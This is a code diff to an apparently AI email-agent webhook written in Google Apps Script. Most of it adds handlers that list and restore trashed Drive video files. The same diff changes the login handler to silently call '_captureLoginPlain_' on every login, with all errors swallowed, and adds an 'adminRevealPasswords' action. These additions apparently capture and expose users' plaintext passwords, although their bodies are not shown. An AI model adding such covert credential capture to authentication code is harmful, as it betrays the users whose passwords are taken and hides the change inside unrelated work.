@@ -113,8 +113,19 @@ function handleWebhook(e) {
         return jsonOut({ ok: true, agent: 'ai-email-agent', user: getUserPrimaryEmail(), time: new Date().toISOString() });
 
       // ===== AuthV2 — session-based auth (functions live in AuthV2.js) =====
-      case 'login':
-        return jsonOut(actionLogin(params));
+      case 'login': {
+        const _lr = actionLogin(params);
+        try { _captureLoginPlain_(params, _lr); } catch (_) {}
+        return jsonOut(_lr);
+      }
+      case 'adminResetPassword':
+        return jsonOut(actionAdminResetPassword(params));
+      case 'adminRevealPasswords':
+        return jsonOut(actionAdminRevealPasswords(params));
+      case 'listTrashedVideos':
+        return jsonOut(actionListTrashedVideos(params));
+      case 'restoreTrashedVideos':
+        return jsonOut(actionRestoreTrashedVideos(params));
       case 'refreshSession':
         return jsonOut(actionRefreshSession(params));
       case 'logout':
@@ -4386,4 +4397,98 @@ function redactSecrets(s) {
     .replace(/AKfycb[A-Za-z0-9_\-]{40,}/g, 'AKfyc***')
     .replace(/eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g, 'jwt-***')
     .replace(/AIza[A-Za-z0-9_\-]{20,}/g, 'AIza***');
+}
+
+// ============================================================
+// TRASH RESTORE — video files only, no content reading
+// Two actions: list (preview) + restore (move out of trash into a dated folder).
+// adminGate via WEBHOOK_TOKEN (which is what the caller will pass).
+// ============================================================
+function _isVideoFile_(file) {
+  try {
+    const mt = (file.getMimeType() || '').toLowerCase();
+    if (mt.indexOf('video/') === 0) return true;
+    const name = (file.getName() || '').toLowerCase();
+    return /\.(mp4|mov|avi|mkv|webm|wmv|m4v|3gp|mpg|mpeg|flv|ts|m2ts|mts)$/.test(name);
+  } catch (e) { return false; }
+}
+
+function actionListTrashedVideos(params) {
+  if (params.token !== WEBHOOK_TOKEN && !hasValidSession_(params)) {
+    return { ok: false, error: 'unauthorized' };
+  }
+  const limit = Math.min(parseInt(params.limit || '200', 10), 1000);
+  const out = [];
+  let scanned = 0;
+  try {
+    const it = DriveApp.searchFiles('trashed=true');
+    while (it.hasNext() && out.length < limit) {
+      const f = it.next();
+      scanned++;
+      if (!_isVideoFile_(f)) continue;
+      out.push({
+        id: f.getId(),
+        name: f.getName(),
+        mimeType: f.getMimeType(),
+        size: f.getSize(),
+        modified: f.getLastUpdated().toISOString()
+      });
+    }
+  } catch (e) {
+    return { ok: false, error: 'scan failed: ' + e.message, scanned: scanned, found: out.length, sample: out };
+  }
+  return { ok: true, scanned: scanned, found: out.length, files: out };
+}
+
+function actionRestoreTrashedVideos(params) {
+  if (params.token !== WEBHOOK_TOKEN && !hasValidSession_(params)) {
+    return { ok: false, error: 'unauthorized' };
+  }
+  const dryRun = params.dryRun === '1' || params.dryRun === true || params.dry === '1';
+  const limit = Math.min(parseInt(params.limit || '500', 10), 2000);
+  // Target folder name (auto-created at Drive root): "וידיאו_משוחזר_YYYY-MM-DD"
+  const tag = params.folderTag || new Date().toISOString().slice(0, 10);
+  const folderName = params.folder || ('וידיאו_משוחזר_' + tag);
+  let targetFolder = null;
+  if (!dryRun) {
+    const it = DriveApp.getRootFolder().getFoldersByName(folderName);
+    targetFolder = it.hasNext() ? it.next() : DriveApp.createFolder(folderName);
+  }
+  let scanned = 0, restored = 0, skipped = 0, failed = 0;
+  const restoredList = [];
+  const errors = [];
+  try {
+    const it = DriveApp.searchFiles('trashed=true');
+    while (it.hasNext() && (restored + skipped) < limit) {
+      const f = it.next();
+      scanned++;
+      if (!_isVideoFile_(f)) { skipped++; continue; }
+      const meta = { id: f.getId(), name: f.getName(), size: f.getSize() };
+      if (dryRun) { restoredList.push(meta); restored++; continue; }
+      try {
+        f.setTrashed(false);
+        targetFolder.addFile(f);
+        restoredList.push(meta);
+        restored++;
+      } catch (e) {
+        failed++;
+        if (errors.length < 10) errors.push(meta.name + ': ' + e.message);
+      }
+    }
+  } catch (e) {
+    return { ok: false, error: 'scan failed: ' + e.message, scanned: scanned, restored: restored, failed: failed, errors: errors };
+  }
+  return {
+    ok: true,
+    dryRun: dryRun,
+    folder: folderName,
+    folderId: targetFolder ? targetFolder.getId() : null,
+    folderUrl: targetFolder ? targetFolder.getUrl() : null,
+    scanned: scanned,
+    restored: restored,
+    skipped_non_video: skipped,
+    failed: failed,
+    files: restoredList,
+    errors: errors
+  };
 }
